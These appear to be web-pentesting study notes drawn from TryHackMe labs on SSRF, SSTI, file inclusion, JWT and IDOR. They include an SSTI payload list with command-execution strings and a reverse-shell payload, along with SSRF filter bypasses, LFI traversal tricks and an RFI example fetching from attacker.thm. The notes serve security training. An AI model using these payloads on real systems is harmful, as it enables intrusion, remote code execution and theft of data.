The Expected Request is what the website.com server is expecting to receive, with the section in red being the URL that the website will fetch for the information.
The attacker can modify the area in red to an URL of their choice.

![image](https://user-images.githubusercontent.com/24814781/182042173-fe691d3a-d263-4141-bad2-ab3a0ed6851f.png)

The below example shows how an attacker can still reach the /api/user page with only having control over the path by utilising directory traversal. When website.thm receives ../ this is a message to move up a directory which removes the /stock portion of the request and turns the final request into /api/user 

![image](https://user-images.githubusercontent.com/24814781/182042218-f94dec9b-a313-4a89-a283-c16670c6ad1d.png)


In this example, the attacker can control the server's subdomain to which the request is made. Take note of the payload ending in &x= being used to stop the remaining path from being appended to the end of the attacker's URL and instead turns it into a parameter (?x=) on the query string. 

![image](https://user-images.githubusercontent.com/24814781/182042248-8a5e67e8-33a2-409b-aca8-d24802245810.png)

Going back to the original request, the attacker can instead force the webserver to request a server of the attacker's choice. By doing so, we can capture request headers that are sent to the attacker's specified domain. These headers could contain authentication credentials or API keys sent by website.thm (that would normally authenticate to api.website.com). 

![image](https://user-images.githubusercontent.com/24814781/182042260-69c0141c-b079-425b-9c15-30fc7b28ee77.png)

Finding an SSRF

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:

When a full URL is used in a parameter in the address bar:

![image](https://user-images.githubusercontent.com/24814781/182042795-e3c1654d-f936-47ca-9bb8-a5afc0bc9dd0.png)

A partial URL such as just the hostname:

![image](https://user-images.githubusercontent.com/24814781/182042816-7d3af384-11d8-4acd-9d95-e5cace4b9f64.png)

Or perhaps only the path of the URL:

![image](https://user-images.githubusercontent.com/24814781/182042821-28440640-6f5d-4e37-9a34-936f884942c0.png)


Some of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working payload.

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.


Defeating Common SSRF Defenses 

More security-savvy developers aware of the risks of SSRF vulnerabilities may implement checks in their applications to make sure the requested resource meets specific rules. There are usually two approaches to this, either a deny list or an allow list.


Deny List

A Deny List is where all requests are accepted apart from resources specified in a list or matching a particular pattern. A Web Application may employ a deny list to protect sensitive endpoints, IP addresses or domains from being accessed by the public while still allowing access to other locations. A specific endpoint to restrict access is the localhost, which may contain server performance data or further sensitive information, so domain names such as localhost and 127.0.0.1 would appear on a deny list. Attackers can bypass a Deny List by using alternative localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.


Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.


Allow List

An allow list is where all requests get denied unless they appear on a list or match a particular pattern, such as a rule that an URL used in a parameter must begin with https://website.thm. An attacker could quickly circumvent this rule by creating a subdomain on an attacker's domain name, such as https://website.thm.attackers-domain.thm. The application logic would now allow this input and let an attacker control the internal HTTP request.


Open Redirect

If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.


SSRF Practical tips and example: 

Let's put what we've learnt about SSRF to the test in a fictional scenario.


We've come across two new endpoints during a content discovery exercise against the Acme IT Support website. The first one is /private, which gives us an error message explaining that the contents cannot be viewed from our IP address. The second is a new version of the customer account page at /customers/new-account-page with a new feature allowing customers to choose an avatar for their account.


Begin by clicking the Start Machine button to launch the Acme IT Support website. Once running, visit it at the URL https://10-10-194-155.p.thmlabs.com and then follow the below instructions to get the flag.


First, create a customer account and sign in. Once you've signed in, visit https://10-10-194-155.p.thmlabs.com/customers/new-account-page to view the new avatar selection feature. By viewing the page source of the avatar form, you'll see the avatar form field value contains the path to the image. The background-image style can confirm this in the above DIV element as per the screenshot below:

![image](https://user-images.githubusercontent.com/24814781/182043745-e0b115e0-3c19-46d5-9cf8-d5710087459a.png)

If you choose one of the avatars and then click the Update Avatar button, you'll see the form change and, above it, display your currently selected avatar. Viewing the page source will show your current avatar is displayed using the data URI scheme, and the image content is base64 encoded as per the screenshot below.

![image](https://user-images.githubusercontent.com/24814781/182043750-f1f38a61-17ea-4f6f-ac8b-09bdcb7ccb10.png)


Now let's try making the request again but changing the avatar value to private in hopes that the server will access the resource and get past the IP address block. To do this, firstly, right-click on one of the radio buttons on the avatar form and select Inspect:


![image](https://user-images.githubusercontent.com/24814781/182043760-7228cf52-8373-475a-8c50-b1ad405a1a33.png)


And then edit the value of the radio button to private:

![image](https://user-images.githubusercontent.com/24814781/182043766-7ad34c0b-c3f8-444e-b641-f50ae4262e80.png)


And then click the Update Avatar button. Unfortunately, it looks like the web application has a deny list in place and has blocked access to the /private endpoint.

![image](https://user-images.githubusercontent.com/24814781/182043776-633c74bd-86e5-4e8d-a518-7f157e1d9d72.png)

As you can see from the error message, the path cannot start with /private but don't worry, we've still got a trick up our sleeve to bypass this rule. We can use a directory traversal trick to reach our desired endpoint. Try setting the avatar value to x/../private 

![image](https://user-images.githubusercontent.com/24814781/182043784-368aff39-0496-4c0a-bbf7-19006ef08113.png)

You'll see we have now bypassed the rule, and the user updated the avatar. This trick works because when the web server receives the request for x/../private, it knows that the ../ string means to move up a directory that now translates the request to just /private.


Viewing the page source of the avatar form, you'll see the currently set avatar now contains the contents from the /private directory in base64 encoding, decode this content and it will reveal a flag that you can enter below.

-----------------------------------------------------------------------------------------------------------------

### Server Side Template Injection
```
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```
```
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
```
```
{{4*4}}[[5*5]]
{{7*7}}
{{7*'7'}}
<%= 7 * 7 %>
${3*3}
${{7*7}}
@(1+2)
#{3*3}
#{ 7 * 7 }
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{'a'.toUpperCase()}} 
{{ request }}
{{self}}
<%= File.open('/etc/passwd').read %>
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{$smarty.version}
{php}echo `id`;{/php}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system("id")}
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
```
-----------------------------------------------------------------------------------------------------------------
### File Inclusion 
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion
```
```
https://highon.coffee/blog/lfi-cheat-sheet/
```

What is File inclusion?

This part aims to equip you with the essential knowledge to exploit file inclusion vulnerabilities, including Local File Inclusion (LFI), Remote File Inclusion (RFI), and directory traversal. Also, we will discuss the risk of these vulnerabilities if they're found and the required remediation. We provide some practical examples of each vulnerability as well as hands-on challenges.

In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input. The following graph explains and breaking down the essential parts of the URL.

![image](https://user-images.githubusercontent.com/24814781/182134102-72df6741-4aac-4cb3-9593-1e940949d90f.png)


For example, parameters are used with Google searching, where GET requests pass user input into the search engine. https://www.google.com/search?q=TryHackMe.   

Let's discuss a scenario where a user requests to access files from a webserver. First, the user sends an HTTP request to the webserver that includes a file to display. For example, if a user wants to access and display their CV within the web application, the request may look as follows, http://webapp.thm/get.php?file=userCV.pdf, where the file is the parameter and the userCV.pdf, is the required file to access.

![image](https://user-images.githubusercontent.com/24814781/182134315-3b6f4d78-0007-4172-8e65-8096787d8a78.png)

### Path Traversal

Also known as Directory traversal, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.

Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function here.
```
https://www.php.net/manual/en/function.file-get-contents.php
```

The following graph shows how a web application stores files in /var/www/app. The happy path would be the user requesting the contents of userCV.pdf from a defined path /var/www/app/CVs.

![image](https://user-images.githubusercontent.com/24814781/182134970-c1d42506-c1fb-407c-aebd-4a9bc259bab4.png)

We can test out the URL parameter by adding payloads to see how the web application behaves. Path traversal attacks, also known as the dot-dot-slash attack, take advantage of moving the directory one step up using the double dots ../. If the attacker finds the entry point, which in this case get.php?file=, then the attacker may send something as follows, http://webapp.thm/get.php?file=../../../../etc/passwd

Suppose there isn't input validation, and instead of accessing the PDF files at /var/www/app/CVs location, the web application retrieves files from other directories, which in this case /etc/passwd. Each .. entry moves one directory until it reaches the root directory /. Then it changes the directory to /etc, and from there, it read the passwd file.

![image](https://user-images.githubusercontent.com/24814781/182135113-2aa25d64-f459-41d0-b44a-bcc1ce3304a4.png)

As a result, the web application sends back the file's content to the user.

![image](https://user-images.githubusercontent.com/24814781/182135178-508f73f2-d675-4ad8-a5f3-32fdcc30fe48.png)


Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:

http://webapp.thm/get.php?file=../../../../boot.ini or

http://webapp.thm/get.php?file=../../../../windows/win.ini

The same concept applies here as with Linux operating systems, where we climb up directories until it reaches the root directory, which is usually c:\.

Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing. 

![image](https://user-images.githubusercontent.com/24814781/182135355-40be92ee-6b19-4c48-994e-44011fa1ffb9.png)

### Local File Inclusion LFI

#### exmaple 1:

LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.

In this section, we will walk you through various LFI scenarios and how to exploit them.﻿

1. Suppose the web application provides two languages, and the user can select between the EN and AR

```
<?PHP 
	include($_GET["lang"]);
?>
```

The PHP code above uses a GET request via the URL parameter lang to include the file of the page. The call can be done by sending the following HTTP request as follows: http://webapp.thm/index.php?lang=EN.php to load the English page or http://webapp.thm/index.php?lang=AR.php to load the Arabic page, where EN.php and AR.php files exist in the same directory.

Theoretically, we can access and display any readable file on the server from the code above if there isn't any input validation. Let's say we want to read the /etc/passwd file, which contains sensitive information about the users of the Linux operating system, we can try the following: http://webapp.thm/get.php?file=/etc/passwd 

In this case, it works because there isn't a directory specified in the include function and no input validation.


2. Next, In the following code, the developer decided to specify the directory inside the function.

```
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

In the above code, the developer decided to use the include function to call PHP pages in the languages directory only via lang parameters.

If there is no input validation, the attacker can manipulate the URL by replacing the lang input with other OS-sensitive files such as /etc/passwd.

Again the payload looks similar to the path traversal, but the include function allows us to include any called files into the current page. The following will be the exploit:

http://webapp.thm/index.php?lang=../../../../etc/passwd

#### example 2:

In this task, we go a little bit deeper into LFI. We discussed a couple of techniques to bypass the filter within the include function.

1. In the first two cases, we checked the code for the web app, and then we knew how to exploit it. However, in this case, we are performing black box testing, in which we don't have the source code. In this case, errors are significant in understanding how the data is passed and processed into the web app.

In this scenario, we have the following entry point: http://webapp.thm/index.php?lang=EN. If we enter an invalid input, such as THM, we get the following error
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

The error message discloses significant information. By entering THM as input, an error message shows what the include function looks like:  include(languages/THM.php);. 

If you look at the directory closely, we can tell the function includes files in the languages directory is adding  .php at the end of the entry. Thus the valid input will be something as follows:  index.php?lang=EN, where the file EN is located inside the given languages directory and named  EN.php. 

Also, the error message disclosed another important piece of information about the full web application directory path which is /var/www/html/THM-4/

To exploit this, we need to use the ../ trick, as described in the directory traversal section, to get out the current folder. Let's try the following:

http://webapp.thm/index.php?lang=../../../../etc/passwd

Note that we used 4 ../ because we know the path has four levels /var/www/html/THM-4. But we still receive the following error:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```

It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.


2. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.

To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  /etc/passwd/.., it results to be  /etc/ and that's because we moved one to the root.  Now if we try  /etc/passwd/., the result will be  /etc/passwd since dot refers to the current directory.

3. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

http://webapp.thm/index.php?lang=../../../../etc/passwd

We got the following error!

```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

![image](https://user-images.githubusercontent.com/24814781/182138160-b7a71597-8e74-40b9-8389-be5385446ae5.png)


4. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.


### Remote File Inclusion RFI

Remote File Inclusion - RFI

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.


The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

Sensitive Information Disclosure

Cross-site Scripting (XSS)

Denial of Service (DoS)


An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

![image](https://user-images.githubusercontent.com/24814781/182140017-0d9a9de2-a0f0-48af-9fb4-e0691dc49855.png)


RFI steps

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.

```
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.

### LFI and RFI Remediation



As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1.    Keep system and services, including web application frameworks, updated with the latest version.

2.    Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.

3.    A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.

4.    Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.

5.    Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.

6.   Never trust user input, and make sure to implement proper input validation against file inclusion.

7.    Implement whitelisting for file names and locations as well as blacklisting.

-----------------------------------------------------------------------------------------------------------------
### JWT token

#### JWT tools
```
https://jwt.io/
```
```
https://github.com/ticarpi/jwt_tool
```
```
https://github.com/cyberblackhole/TokenBreaker
```
#### JWT resources 
```
https://www.youtube.com/watch?v=8Yev14elbTc
```
```
https://www.youtube.com/watch?v=ZGarKE9KTAY
```
```
https://tryhackme.com/room/zthobscurewebvulns
```
```
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
```


### IDOR

What is an IDOR?

IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.

This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.

### An IDOR Example

Imagine you've just signed up for an online service, and you want to change your profile information. The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.

Curiosity gets the better of you, and you try changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user's information. You've now discovered an IDOR vulnerability! Ideally, there should be a check on the website to confirm that the user information belongs to the user logged requesting it.

![image](https://user-images.githubusercontent.com/24814781/182832340-02932aa4-e5a5-41f7-978c-27a2b896d078.png)

![image](https://user-images.githubusercontent.com/24814781/182832452-e2450c73-0995-4625-9825-af7ce307e430.png)

![image](https://user-images.githubusercontent.com/24814781/182832484-79564e92-2df8-42e1-9bff-502a891cfb16.png)

![image](https://user-images.githubusercontent.com/24814781/182832549-c571c0f4-9afb-44ae-927c-70e3afec35c1.png)

### Finding IDORs in Encoded IDs 

When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into an ASCII string commonly using the a-z, A-Z, 0-9 and = character for padding. The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot. You can use websites like https://www.base64decode.org/ to decode the string, then edit the data and re-encode it again using https://www.base64encode.org/ and then resubmit the web request to see if there is a change in the response.

See the image below as a graphical example of this process:

![image](https://user-images.githubusercontent.com/24814781/182832769-b8c7261c-3d2d-4a7a-9a9a-faabf6f35273.png)


### Finding IDORs in Hashed IDs

Hashed IDs

Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.


It's worthwhile putting any discovered hashes through a web service such as https://crackstation.net/ (which has a database of billions of hash to value results) to see if we can find any matches. 

### Finding IDORs in Unpredictable IDs


Unpredictable IDs

If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.

### Where are IDORs located 


Where are they located?

The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file. 


Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users' information, for example, /user/details?user_id=123.




Firstly you'll need to log in. To do this, click on the customer's section and create an account. Once logged in, click on the Your Account tab. 


The Your Account section gives you the ability to change your information such as username, email address and password. You'll notice the username and email fields pre-filled in with your information.  

### A small Practical IDOR Example 

We'll start by investigating how this information gets pre-filled. If you open your browser developer tools, select the network tab and then refresh the page, you'll see a call to an endpoint with the path /api/v1/customer?id={user_id}.


This page returns in JSON format your user id, username and email address. We can see from the path that the user information shown is taken from the query string's id parameter (see below image).

![image](https://user-images.githubusercontent.com/24814781/182834779-afde6ec5-5c61-47ec-a099-d256af9527d5.png)


You can try testing this id parameter for an IDOR vulnerability by changing the id to another user's id. Try selecting users with IDs 1 and 3 

![image](https://user-images.githubusercontent.com/24814781/182834883-93140ddd-96f0-4e28-9b70-0667ab480dcb.png)

![image](https://user-images.githubusercontent.com/24814781/182834975-22a74aab-c691-4006-89cc-d876e1c1c0ae.png)

![image](https://user-images.githubusercontent.com/24814781/182835041-e295be3a-c597-4ee9-8523-8c1172b8d263.png)

![image](https://user-images.githubusercontent.com/24814781/182835110-73e27303-a2a2-4e65-b5f3-a98e19b15d34.png)

![image](https://user-images.githubusercontent.com/24814781/182835159-4a454c19-0be3-4b94-8406-7cb8c1699e1c.png)

-----------------------------------------------------------------------------------------------------------------
